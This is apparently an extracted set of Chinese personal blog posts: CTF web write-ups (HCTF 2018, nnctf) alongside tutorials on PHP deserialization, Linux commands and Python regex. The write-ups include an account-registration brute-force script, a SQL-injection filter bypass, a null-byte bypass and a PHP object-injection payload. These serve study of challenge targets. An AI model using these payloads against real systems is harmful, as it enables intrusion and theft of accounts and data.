https://blog.csdn.net/nzjdsds/article/details/81260335 Game注册账号进去之后发现，他将所有的用户名的列了出来 http://game.2018.hctf.io/web2/user.php?order=id 通过URL发现排序的方式是可控的所以我们让他按密码排序 http://game.2018.hctf.io/web2/user.php?order=password 然后通过建立不同的账号密码来确定admin的密码 admin的账号的id为1 这是网上大佬批量注册账号的代码通过这个账号来手工测试密码 import requests import hashlib import threading def md5(str): sha = hashlib.md5(str) encrypts = sha.hexdigest() return encrypts def reg(username,password): url = &#39;http://game.2018.hctf.io/web2/action.php?action=reg&#39; data = { &quot;username&quot;:username, &quot;password&quot;:password, &quot;sex&quot;:&quot;1&quot;, &quot;submit&quot;:&quot;submit&quot; } headers = { &#39;Connection&#39;: &#39;close&#39;, } r = requests.post(url=url,data=data,headers=headers) def fuzz(start,end): for i in range(start,end): password = &#39;dSa8&amp;&amp;!@#$%^&amp;d1nGy1aS3dj&#39;+chr(i) username=md5(password) content = username + &quot; &quot; + password +&quot; &quot;+ str(i) + &quot;\\n&quot; reg(username, password) print content print str(start)+&#39;~&#39;+str(end)+&quot;complete&quot; step=20 for i in range(33,127,step): t = threading.Thread(target=fuzz, args=(i, i+step)) t.start() 注册好多号不断的逼近admin的密码，登录后访问flag.php【user.php里有提示】，拿到flag。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"初识php反序列化","slug":"初识php反序列化","date":"2019-01-08T15:39:38.000Z","updated":"2019-05-29T12:33:30.965Z","comments":true,"path":"2019/01/08/初识php反序列化/","link":"","permalink":"http://yoursite.com/2019/01/08/初识php反序列化/","excerpt":"php的序列化与反序列化关于这个时有两个函数的 serialize()和unserialize()","text":"php的序列化与反序列化关于这个时有两个函数的 serialize()和unserialize() serialize()函数当在php创建了一个对象后，可以通过serialize()函数把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。 序列化格式整形的序列化格式&lt;?php $number = 34; var_dump(serialize($number)); ?&gt; 输出结果为： string(5) &quot;i:34;&quot; 解释： 因为serialize()函数所以输出的是一个字符串类型的 i表示integer类型 34就是变量的值 doule类型的序列化格式&lt;?php $double = 5.5; var_dump(serialize(double)); ?&gt; 输出结果为： string(6) &quot;d:5.5;&quot; 解释 d 表示double类型 5.5 为变量的值 string类型的序列化格式&lt;?php $str = &#39;chuddy&#39;; var_dump(serialize($str)); echo &quot;&lt;br&gt;&quot;; ?&gt; 输出结果为： string(13) &quot;s:6:&quot;chuddy&quot;;&quot; 解释： s 代表string类型 chuddy 为变量的值 布尔类型的序列化格式&lt;?php $bool = true; $bool_1 = false; var_dump(serialize($bool)); echo &quot;&lt;br&gt;&quot;; var_dump(serialize($bool_1)); echo &quot;&lt;br&gt;&quot;; ?&gt; 输出结果： string(4) &quot;b:1;&quot; string(4) &quot;b:0;&quot; 解释： b 表示布尔类型 1 表示布尔变量的值为true 0 表示布尔类型的值为false null类型的序列化格式&lt;?php $null = null; var_dump(serialize($null)); ?&gt; 输出结果： string(2) &quot;N;&quot; 解释 N 代表的null类型 数组类型的序列化格式&lt;?php $arr = array(&#39;a&#39; =&gt; 1, &#39;b&#39; =&gt; 2); var_dump(serialize($arr)); echo &quot;&lt;br&gt;&quot;; ?&gt; 输出结果： string(30) &quot;a:2:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;}&quot; 解释： a 表示array类型 2 表示数组的长度 {} 内的时数组各个值得类型，长度以及值 类的序列化格式&lt;?php class chuddy { public $data; private $pass; public function __construct($data, $pass) { $this-&gt;data = $data; $this-&gt;pass = $pass; } } $cc = new chuddy(&#39;chuddy&#39;, &#39;haha&#39;); var_dump(serialize($cc)); ?&gt; 输出结果为： string(72) &quot;O:6:&quot;chuddy&quot;:2:{s:4:&quot;data&quot;;s:6:&quot;chuddy&quot;;s:12:&quot;chuddypass&quot;;s:4:&quot;haha&quot;;}&quot; 解释： O 代表对象类型 2 代表类里的变量多少 序列化对象class CB { public $CB_data = &#39;cb&#39;; } class CC extends CB{ const SECOND = 60; public $data; private $pass; public function __construct($data, $pass) { $this-&gt;data = $data; $this-&gt;pass = $pass; } public function setPass($pass) { $this-&gt;pass = $pass; } } $cc = new CC(&#39;uu&#39;, true); var_dump(serialize($cc)); 输出结果为： string(75) &quot;O:2:&quot;CC&quot;:3:{s:4:&quot;data&quot;;s:2:&quot;uu&quot;;s:8:&quot; CC pass&quot;;b:1;s:7:&quot;CB_data&quot;;s:2:&quot;cb&quot;;}&quot; 序列化对象时，不会保存常量的值。对于父类中的变量，则会保留。 对象序列化自定义在序列化对象时，有一些敏感数据，我们不需要保存，这里该如何处理呢 在我们调用serialize()函数时，该函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化的操作。可以通过重载这个方法，从而自定义序列化行为 class User{ const SITE = &#39;uusama&#39;; public $username; public $nickname; private $password; public function __construct($username, $nickname, $password) { $this-&gt;username = $username; $this-&gt;nickname = $nickname; $this-&gt;password = $password; } // 重载序列化调用的方法 public function __sleep() { // 返回需要序列化的变量名，过滤掉password变量 return array(&#39;username&#39;, &#39;nickname&#39;); } } $user = new User(&#39;uusama&#39;, &#39;uu&#39;, &#39;123456&#39;); var_dump(serialize($user)); 返回结果为： string(67) &quot;O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;}&quot; 这样就忽略了password字段的值 可以保护敏感数据 总结所以序列化对于不同类型得到的字符串格式为： String : s:size:value; Integer : i:value; Boolean : b:value;(保存1或0) Null : N; Array : a:size:{key definition;value definition;(repeated per element)} Object : O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)} 反序列化反序列化函数unserialize()反序列化函数用于将单一的已序列化的变量转换回PHP的值注意： 如果传递的字符串不可解序列化，则返回false，并产生一个E_NOTICE 返回的是转换之后的值，可为integer、float、string、array或object 若被反序列化的变量时一个对象，在成功重新构造对象之后，PHP会自动的试图去调用__wakeup()成员函数（如果存在的话） class User{ const SITE = &#39;uusama&#39;; public $username; public $nickname; private $password; public function __construct($username, $nickname, $password) { $this-&gt;username = $username; $this-&gt;nickname = $nickname; $this-&gt;password = $password; } // 重载序列化调用的方法 public function __sleep() { // 返回需要序列化的变量名，过滤掉password变量 return array(&#39;username&#39;, &#39;nickname&#39;); } public function __wakeup() { $this-&gt;password = $this-&gt;username; } } $user_ser = &#39;O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;}&#39;; var_dump(unserialize($user_ser)) 输出结果： object(User)#3 (3) { [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(6) &quot;uusama&quot; } 我也尝试了一下没有__wakeup()的情况 输出结果为： object(User)#3 (3) { [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; NULL } __wakeup()函数在对象被构建以后执行，所以$this-&gt;username的值不为空 反序列化时，会尽量将变量值进行匹配并复制给序列化后的对象 未定义的类的处理$user_ser = &#39;O:4:&quot;haha&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;}&#39;; var_dump(unserialize($user_ser)); echo &quot;&lt;br&gt;&quot;; haha这个类是没有定义的 但是还能正常输出 没有报错 输出结果为： object(__PHP_Incomplete_Class)#3 (3) { [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt; string(4) &quot;haha&quot; [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; } 有两种方案进行修复 定义__autoload()等函数，指定发现未定义类时加载类的定义文件 可通过 php.ini、ini_set() 或 .htaccess 定义unserialize_callback_func。每次实例化一个未定义类时它都会被调用 // unserialize_callback_func 从 PHP 4.2.0 起可用 ini_set(&#39;unserialize_callback_func&#39;, &#39;mycallback&#39;); // 设置您的回调函数 function mycallback($classname) { // 只需包含含有类定义的文件 // $classname 指出需要的是哪一个类 } // 建议使用下面的函数，代替__autoload() spl_autoload_register(function ($class_name) { // 动态加载未定义类的定义文件 require_once $class_name . &#39;.php&#39;; }); 附上参考链接 http://uusama.com/663.html","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"linux的基本操作","slug":"linux的基本操作","date":"2018-12-09T08:20:04.000Z","updated":"2019-05-29T12:32:10.074Z","comments":true,"path":"2018/12/09/linux的基本操作/","link":"","permalink":"http://yoursite.com/2018/12/09/linux的基本操作/","excerpt":"","text":"linuxLinux 文件系统是一个目录树的结构，文件系统结构从一个根目录开始，根目录下可以有任意多个文件和子目录，子目录中又可以有任意多个文件和子目录 bin 存放二进制可执行文件(ls,cat,mkdir等) boot 存放用于系统引导时使用的各种文件 dev 用于存放设备文件 etc 存放系统配置文件 home 存放所有用户文件的根目录 lib 存放跟文件系统中的程序运行所需要的共享库及内核模块 mnt 系统管理员安装临时文件系统的安装点 opt 额外安装的可选应用程序包所放置的位置 proc 虚拟文件系统，存放当前内存的映射 root 超级用户目录 sbin 存放二进制可执行文件，只有root才能访问 tmp 用于存放各种临时文件 usr 用于存放系统应用程序，比较重要的目录/usr/local 本地管理员软件安装目录 var 用于存放运行时需要改变数据的文件 对目录的操作lsls -a 可以显示全部文档 包括隐藏文档都会背一起列出来 ls -d 仅仅列出目录本身 而不是列出目录内的文件数据 ls -l 可以显示 文件的属性与权限等等 其中这些在后面可以见 地址来列出 其他文件的信息 ls -al /var/www 显示为 www目录下的文件信息 drwxr-xr-x 3 root root 4096 3月 19 22:36 . drwxr-xr-x 15 root root 4096 3月 19 20:39 .. drwxr-xr-x 3 root root 4096 3月 20 19:37 html lrwxrwxrwx 1 root root 21 3月 19 22:36 phpmyadmin -&gt; /usr/share/phpmyadmin pwd显示目录所在位置 mkdirmkdir 目录名 创建新目录 mkdir -p /text1/text2/text3/text4 可以递归创建你所需要的目录 mkdir -m 711 text2 创建权限为rwx--x--x 的目录 rmdirrmdir 目录名 删除空目录 rmdir -p 目录名 连同上一级空的目录也一起删除 cp拷贝文件和目录 cp 参数 来源位置 目标位置 参数如下： -a：相当於 -pdr 的意思，至於 pdr 请参考下列说明；(常用) -d：若来源档为连结档的属性(link file)，则复制连结档属性而非文件本身； -f：为强制(force)的意思，若目标文件已经存在且无法开启，则移除后再尝试一次； -i：若目标档(destination)已经存在时，在覆盖时会先询问动作的进行(常用) -l：进行硬式连结(hard link)的连结档创建，而非复制文件本身； -p：连同文件的属性一起复制过去，而非使用默认属性(备份常用)； -r：递归持续复制，用於目录的复制行为；(常用) -s：复制成为符号连结档 (symbolic link)，亦即『捷径』文件； -u：若 destination 比 source 旧才升级 destination ！ rmrm [-fir] 文件或目录 -f : 就是force的意思，忽略不存在的文件，不会有警告信息 -i : 互动模式，在删除前会询问使用者的意见 -r : 递归删除。最常见的是在目录里面删除了，比较危险 mv(移动文件或目录，或修改名称)mv 文件 目录 把文件移动到目录下 mv 目录名字 目录新名字 目录该名称 Linux文件内容查看cat 由第一行开始显示文件内容 tac 有最后一行开始显示文件内容 nl 显示的时候，顺着输出行号 more 一页一页的显示文件内容 less 与more相似，但比more更好的是可以向前翻页 head 只看头几行 tail 只看尾几行 cat-b 列出行号，仅针对非空白行做行号显示，空白行不标行号 head tailhead -n 10 1.txt 显示1.txt头十行的内容 tail -n 10 1.txt 显示1.txt尾巴十行的内容 Linux磁盘管理df : 列出文件系统的整体磁盘使用量 du : 检查磁盘空间使用量 fdisk : 用于磁盘分区 df常见的参数 -a : 列出所有的文件系统，包括系统特有的文件系统 -k : 以KBytes的容量来显示各文件系统 -m : 以MBytes的容量来显示各文件系统 -h : 艺人们较易阅读的格式自行显示 -H : 以M=1000K 取代 M=1024k 的进位方式 -T : 显示文件系统类型，连同该partitio的filesystem名称也列出 -i : 不用硬盘容量，而以inode的数量来显示 du常见的参数 -a ：列出所有的文件与目录容量，因为默认仅统计目录底下的文件量而已。 -h ：以人们较易读的容量格式 (G/M) 显示； -s ：列出总量而已，而不列出每个各别的目录占用容量； -S ：不包括子目录下的总计，与 -s 有点差别。 -k ：以 KBytes 列出容量显示； -m ：以 MBytes 列出容量显示； 特殊符号表特殊符号 代表意义 [:alnum:] 代表英文大小写字符及数字，亦即 0-9, A-Z, a-z [:alpha:] 代表任何英文大小写字符，亦即 A-Z, a-z [:blank:] 代表空格键不 [Tab] 按键两者 [:cntrl:] 代表键盘上面的控制按键，亦即包括 CR, LF, Tab, Del.. 等等 [:digit:] 代表数字而已，亦即 0-9 [:graph:] 除了空格符 (空格键不 [Tab] 按键) 外的其他所有按键 [:lower:] 代表小写字符，亦即 a-z [:print:] 代表任何可以被打印出来的字符 [:punct:] 代表标点符号 (punctuation symbol)，亦即：” ‘ ? ! ; : # $… [:upper:] 代表大写字符，亦即 A-Z [:space:] 任何会产生空白的字符，包括空格键, [Tab], CR 等等 [:xdigit:] 代表 16 进位的数字类型，因此包括： 0-9, A-F, a-f 的数字不字符 grep进阶的选项与参数[root@www ~]# grep [-acinv] [--color=auto] &#39;搜寻字符串&#39; filename 选项与参数： -a ：将 binary 档案以 text 档案的方式搜寻数据 -c ：计算找到 &#39;搜寻字符串&#39; 的次数 -i ：忽略大小写的不同，所以大小写视为相同 -n ：顺便输出行号 -v ：反向选择，亦即显示出没有 &#39;搜寻字符串&#39; 内容的那一行！ --color=auto ：可以将找到的关键词部分加上颜色的显示！ -A ：后面可加数字，为 after 的意思，除了列出该行外，后续的 n 行也列出来； -B ：后面可加数字，为 befer 的意思，除了列出该行外，前面的 n 行也列出 练习1.搜索特定字符 cat 1.txt| grep -n &#39;chuddy&#39; grep -n &#39;chuddy&#39; 1.txt # 才知道grep可以直接获得文件的内容，然后进行分析 grep -vn &#39;chuddy&#39; 1.txt 利用中括号[]来搜寻集合字符 grep -n &#39;t[ae]st&#39; chuddy.txt grep -n &#39;[^g]oo&#39; chuddy.txt grep -n &#39;[^a-z]oo&#39; chuddy.txt grep -n &#39;[0-9]&#39; chuddy.txt grep -n &#39;[^[:lower:]]oo&#39; chuddy.txt grep -n &#39;[[:digit:]]&#39; chuddy.txt 3.行首与行尾字符(^ $) 行首(^) grep -n &#39;^the&#39; chuddy.txt grep -n &#39;^[a-z]&#39; chuddy.txt grep -n &#39;^[[:lower:]]&#39; chuddy.txt grep -n &#39;^[^a-zA-Z]&#39; chuddy.txt 行尾($) 找出行尾为‘.’的行。 grep -n &#39;\\.$&#39; chuddy.txt 找出空白行 grep -n &#39;^$&#39; chuddy.txt","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"nnctf writeup","slug":"nnctf-writeup","date":"2018-12-08T15:14:44.000Z","updated":"2019-05-29T12:32:53.008Z","comments":true,"path":"2018/12/08/nnctf-writeup/","link":"","permalink":"http://yoursite.com/2018/12/08/nnctf-writeup/","excerpt":"南宁nnctf web wp","text":"南宁nnctf web wp 超简单打开发现给出了源码 &lt;?php $white_list = range(0,9); require_once(&#39;flag.php&#39;); if(isset($_REQUEST[&#39;no&#39;])){ $a=$_REQUEST[&#39;no&#39;]; if(@ereg(&quot;^[0-9]+$&quot;, $a) === FALSE){ echo &#39;no must be number&#39;; }else{ if(in_array($a,$white_list)){ if(strlen($a)&gt;1){ echo &#39;you are a great dark phper&lt;br&gt;&#39;; echo &quot;&lt;img src=&#39;dark.gif&#39;&gt;&lt;br&gt;&quot;; echo $flag; }else{ echo &#39;you no dark&#39;; } }else{ echo &#39;you are so dark&#39;; } } }else highlight_file(__FILE__); 代码分析： 传递了一个no参数 正则匹配 只能是数字 设置了白名单 长度大于一 playload: ?no=1%00 sql?这个是一个源码泄露但是因为工具的原名跑不出来源码 网上用大佬的工具跑出来了 &lt;?php $flag = &#39;gxnnctf{***************************}&#39;; require_once(&#39;config.php&#39;); $conn = new mysqli($db_servername,$db_username,$db_password,$db_name); if($conn-&gt;connect_error){ die(&quot;Connect failed:&quot;.$conn-&gt;connect_error); } if(isset($_GET[&#39;id&#39;])){ $id = $_GET[&#39;id&#39;]; if(preg_match(&#39;#sleep|benchmark|floor|rand|count|select|from|\\(|\\)|time|date|sec|day#is&#39;,$id)) die(&#39;Don\\&#39;t hurt me :-(&#39;); $sql = &quot;select username from user where id = &quot;.$id; $result = $conn-&gt;query($sql); if($result){ $row = $result-&gt;fetch_array(); }else{ echo mysqli_error($conn); die(); } echo(&#39;hello &#39;.$row[&#39;username&#39;].&#39;&lt;br&gt;&#39;); $username = $row[&#39;username&#39;]; if($username === &#39;guest&#39;){ $ip = @$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]!=&quot;&quot; ? $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]:$_SERVER[&#39;REMOTE_ADDR&#39;]; if(preg_match(&#39;#sleep|benchmark|floor|rand|count|select|from|\\(|\\)|time|date|sec|day#is&#39;,$ip)){ die(&#39;Don\\&#39; hack me&#39;); } if(!empty($ip)){ echo &#39;you from &#39;.$ip.&#39; , I remembered it.&lt;br&gt;&#39;; $conn-&gt;query(&quot;insert into logs(ip) values(&#39;$ip&#39;)&quot;); } $result = $conn-&gt;query(&quot;select username from user where id =&quot;.$id); $row = $result-&gt;fetch_array(); $username = $row[&#39;username&#39;]; if($username === &#39;admin&#39;){ var_dump($_GET[&#39;backdoor&#39;]); if(isset($_GET[&#39;backdoor&#39;])&amp;&amp;$_GET[&#39;backdoor&#39;]===&#39;Melonrind&#39;){ echo &#39;you find the backdoor!!!&lt;br&gt;&#39;; die($flag); }else{ echo &quot;you are so great,but you don\\&#39;t have backdoor,so continue to challenge :(&quot;; } }else{ echo &quot;but i don\\&#39;t waiting for you &quot;; } }else{ echo &#39;emmmmm&#39;; } }else{ echo &#39;welcome to gxnnctf2018!&lt;br&gt;&#39;; echo &#39;i filtered everything,so have a good time :)&#39;; } 分析代码： $result = $conn-&gt;query(&quot;select username from user where id =&quot;.$id); $row = $result-&gt;fetch_array(); $username = $row[&#39;username&#39;]; if($username === &#39;guest&#39;){ $ip = @$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]!=&quot;&quot; ? $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]:$_SERVER[&#39;REMOTE_ADDR&#39;]; if(preg_match(&#39;#sleep|benchmark|floor|rand|count|select|from|\\(|\\)|time|date|sec|day#is&#39;,$ip)){ die(&#39;Don\\&#39; hack me&#39;); } if(!empty($ip)){ echo &#39;you from &#39;.$ip.&#39; , I remembered it.&lt;br&gt;&#39;; $conn-&gt;query(&quot;insert into logs(ip) values(&#39;$ip&#39;)&quot;); } $result = $conn-&gt;query(&quot;select username from user where id =&quot;.$id); $row = $result-&gt;fetch_array(); $username = $row[&#39;username&#39;]; if($username === &#39;admin&#39;){ var_dump($_GET[&#39;backdoor&#39;]); if(isset($_GET[&#39;backdoor&#39;])&amp;&amp;$_GET[&#39;backdoor&#39;]===&#39;Melonrind&#39;){ echo &#39;you find the backdoor!!!&lt;br&gt;&#39;; die($flag); 这些能够得到flag 进行第一次的select语句 查询结果是2 也就是guest 才能进行下列的操作 然后进行第二次的查询语句 如果结果为1 也就是admin get传递参数backdoor === Melonrind 这样才能显示flag 发现这个过滤了好多东西 常用的注入都不能进行了 后来看别人的writeup 使用了 case when then end 的查询 类似这样能得到两个我们所需要的结果 但是因为过滤了空格 我们可以使用%20代替 于是构建playload: ?id=case%20when%20@a%20is%20null%20then%20@a:=2%20else%20@a:=@a-1%20end&amp;backdoor=Melonrind 这样就能得到flag web进入题目发现源代码： &lt;?php //include(&quot;./class.php&quot;); header(&quot;content-type:text/html;charset=utf-8&quot;); error_reporting(0); if(isset($_GET[&quot;file&quot;])){ $file = $_GET[&quot;file&quot;]; if(isset($_GET[&quot;password&quot;])){ $password = $_GET[&quot;password&quot;]; if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;不能现在就给你flag哦&quot;; exit(); }else{ require_once($file); highlight_file(&quot;$file&quot;); $password = unserialize($password); echo $password; } }else{ echo &quot;需要密码的！&lt;br&gt;&quot;; } }else{ highlight_file(&#39;./index.php&#39;); } if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;不能现在就给你flag哦&quot;; exit(); }else{ include($file); $password = unserialize($password); echo $password; } ?&gt; 可见是代码审计。 提示class.php故get传参file=class.php看到需要密码，继续传参password=1（任意值）发现class.php的源码： &lt;!-- hello friend! --&gt; &lt;?php class Flag{//flag_good.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&lt;br&gt;&quot;); } } } ?&gt; 根据两个代码和提示flag_good.php，构造playload: ?file=class.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:13:&quot;flag_good.php&quot;;} 得到flag： flag{132e9a8fcba14cbbaaad09c76d15bd07}","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"python正则表达式","slug":"python正则表达式","date":"2018-11-08T16:36:18.000Z","updated":"2019-05-29T12:45:04.711Z","comments":true,"path":"2018/11/09/python正则表达式/","link":"","permalink":"http://yoursite.com/2018/11/09/python正则表达式/","excerpt":"Python正则表达式","text":"Python正则表达式 正则表达式是一个特殊的字符序列，它能帮助你方便的检查一个字符串是否与某种模式匹配。 re 模块，它提供Perl风格的正则表达式模式。使 Python语言拥有全部的正则表达式功能。 compile 函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。 re模块re.match函数re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。 函数语法： re.match(pattern,string,flags=0) 参数说明： pattern: 匹配正则表达式 strung：要匹配的字符 flags：标志位，用于控制正则表达式的匹配方式，如是否区分大小写，多行匹配等等 匹配成功re.match方法返回一个匹配的对象，否则返回None。我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。 group(num=0) 匹配的整个表达式的字符串，group()可以一次输入多个组号,在这种情况下它将返回一个包含那些组所对值得元组 groups() 返回一个包含所有小组字符串的元组，从1到所含的小组号 #!/usr/bin/python import re line = &quot;Cats are smarter than dogs&quot; matchObj = re.match( r&#39;(.*) are (.*?) .*&#39;, line, re.M|re.I) if matchObj: print &quot;matchObj.group() : &quot;, matchObj.group() print &quot;matchObj.group(1) : &quot;, matchObj.group(1) print &quot;matchObj.group(2) : &quot;, matchObj.group(2) else: print &quot;No match!!&quot; 以上实例执行结果如下： matchObj.group() : Cats are smarter than dogs matchObj.group(1) : Cats matchObj.group(2) : smarter 正则表达式修饰符 - 可选标志 re.l 使匹配对大小写不敏感 re.L 做本地化识别(locale-aware)匹配 re.M 多行匹配，影响 ^ 和 $ re.S 使.匹配包括换行在内的所有字符 re.U 根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B. re.X 该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解 re.search方法re.search：扫描整个字符串并返回第一个成功的匹配。 #!/usr/bin/python # -*- coding: UTF-8 -*- import re print(re.search(&#39;www&#39;, &#39;www.runoob.com&#39;).span()) # 在起始位置匹配 print(re.search(&#39;com&#39;, &#39;www.runoob.com&#39;).span()) # 不在起始位置匹配 以上实例运行输出结果为： (0, 3) (11, 14) #!/usr/bin/python import re line = &quot;Cats are smarter than dogs&quot;; searchObj = re.search( r&#39;(.*) are (.*?) .*&#39;, line, re.M|re.I) if searchObj: print &quot;searchObj.group() : &quot;, searchObj.group() print &quot;searchObj.group(1) : &quot;, searchObj.group(1) print &quot;searchObj.group(2) : &quot;, searchObj.group(2) else: print &quot;Nothing found!!&quot; 以上实例执行结果如下： searchObj.group() : Cats are smarter than dogs searchObj.group(1) : Cats searchObj.group(2) : smarter re.match与re.search的区别re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。 #!/usr/bin/python import re line = &quot;Cats are smarter than dogs&quot;; matchObj = re.match( r&#39;dogs&#39;, line, re.M|re.I) if matchObj: print &quot;match --&gt; matchObj.group() : &quot;, matchObj.group() else: print &quot;No match!!&quot; matchObj = re.search( r&#39;dogs&#39;, line, re.M|re.I) if matchObj: print &quot;search --&gt; matchObj.group() : &quot;, matchObj.group() else: print &quot;No match!!&quot; 以上实例运行结果如下： No match!! search --&gt; matchObj.group() : dogs 检索和替换Python 的re模块提供了re.sub用于替换字符串中的匹配项。 语法： re.sub(pattern, repl, string, count=0, flags=0) 参数： - pattern : 正则中的模式字符串。 - repl : 替换的字符串，也可为一个函数。 - string :要被查找替换的原始字符串。 - count :模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。 例子： #!/usr/bin/python # -*- coding: UTF-8 -*- import re phone = &quot;2004-959-559 # 这是一个国外电话号码&quot; # 删除字符串中的 Python注释 num = re.sub(r&#39;#.*$&#39;, &quot;&quot;, phone) print &quot;电话号码是: &quot;, num # 删除非数字(-)的字符串 num = re.sub(r&#39;\\D&#39;, &quot;&quot;, phone) print &quot;电话号码是 : &quot;, num 以上实例执行结果如下： 电话号码是: 2004-959-559 电话号码是 : 2004959559 repl 参数是一个函数的情况 #!/usr/bin/python # -*- coding: UTF-8 -*- import re def double(a): value = int(a.group(&#39;value&#39;)) print value return str(value * 2) s = &#39;asas55da546sdsa15661&#39; print(re.sub(&#39;(?P&lt;value&gt;\\d+)&#39;, double, s)) 输出结果 55 546 15661 asas110da1092sdsa31322 [Finished in 0.1s] re.compile()函数compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。 re.compile(pattern[, flags]) 参数 - pattern: 一个字符串的正则表达式 - flags: 可选，表示匹配模式 - re.l 忽略大小写 - re.L 表示特殊字符集 \\w, \\W, \\b, \\B, \\s, \\S 依赖于当前环境 - re.M 多行模式 - re.S 即为.并且包含换行符在内的任意符号（.不包括换行符） - re.U 表示特殊字符集 \\w, \\W, \\b, \\B, \\d, \\D, \\s, \\S 依赖于 Unicode 字符属性数据库 - re.X 为了增加可读性，忽略空格和 # 后面的注释 import re pattern = re.compile(r&#39;\\d+&#39;) m = pattern.match(&#39;one12twothree34four&#39;) # 查找头部，没有匹配 print m m = pattern.match(&#39;one12twothree34four&#39;, 2, 10) # 从&#39;e&#39;的位置开始匹配，没有匹配 print m m = pattern.match(&#39;one12twothree34four&#39;, 3, 10) # 从&#39;1&#39;的位置开始匹配，正好匹配 print m 三次输出的结果为： None None &lt;_sre.SRE_Match object at 0x0340E640&gt; # 可以看出当匹配成功时返回一个 Match 对象 # 这些可以接受对象的函数输出： print m.group(0) print m.start(0) print m.end(0) print m.span(0) #输出为： 12 3 5 (3, 5) group([group1,…])方法用于获得一个或多个分组匹配的字符串，当要获取整个匹配的子串时，可直接使用 group()或者group(0)； start([group]) 方法用于获取分组匹配的子串在整个整个字符串中起始的位置(子串第一个字符的索引)，参考默认值为0； end([group]) 方法用于获取分组匹配的子串在整个整个字符串中结束的位置(子串最后一个字符的索引+1)，参考默认值为0； span([group]) 方法返回 (start(group), end(group))。 import re pattern = re.compile(r&#39;([a-z]+) ([a-z]+) ([a-z]+)&#39;, re.I) m = pattern.match(&#39;Hello World Wide Web&#39;) print m.groups() # 等价于 (m.group(1), m.group(2), ...) print m.span(1) # 返回第一个分组匹配成功的子串的索引 输出结果： (&#39;Hello&#39;, &#39;World&#39;, &#39;Wide&#39;) (0, 5) [Finished in 0.1s] findall函数在字符串中找到正则表达式所匹配的所有子串，并返回到一个列表，如果没有找到匹配的，则返回空列表。 注意：match和search是匹配一次findall匹配所有 findall(string[, pos[, endpos]]) 参数 - string 待匹配的字符串 - pos 可选参数，指定字符串的起始位置，默认为0 - endpos 可选参数，指定字符串的结束位置，默认为字符串的长度 import re findnumber = &#39;ahsd5asdj656asd645asd&#39; pattern = re.compile(r&#39;\\d+&#39;) m = pattern.findall(findnumber) n = pattern.findall(findnumber,0,10) print m print n 输出结果： [&#39;5&#39;, &#39;656&#39;, &#39;645&#39;] [&#39;5&#39;, &#39;6&#39;] [Finished in 0.1s] re.finditer和 findall类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。 re.finditer(pattern, string, flags=0) 实例 import re findnumber = &#39;ahsd5asdj656asd645asd&#39; p = re.finditer(r&#39;\\d+&#39;, findnumber) for a in p: print a.group() 输出为： 5 656 645 re.splitsplit 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下： re.split(pattern, string[, maxsplit=0, flags=0]) 参数： pattern 匹配的正则表达式 string 要匹配的字符串。 maxsplit 分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数。 flags 标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 b = re.split(&#39;(\\d+)&#39;, &#39; asd, 541sad, asd5.5415&#39;) print b 输出结果 [&#39; asd, &#39;, &#39;541&#39;, &#39;sad, asd&#39;, &#39;5&#39;, &#39;.&#39;, &#39;5415&#39;, &#39;&#39;] 正则表达式对象re.RegexObjectre.compile() 返回 RegexObject 对象。 re.MatchObjectgroup() 返回被 RE 匹配的字符串。 start() 返回匹配开始的位置 end() 返回匹配结束的位置 span() 返回一个元组包含匹配 (开始,结束) 的位置 正则表达式修饰符 re.I 使匹配对大小写不敏感 re.L 做本地化识别（locale-aware）匹配 re.M 多行匹配，影响 ^ 和 $ re.S 使 . 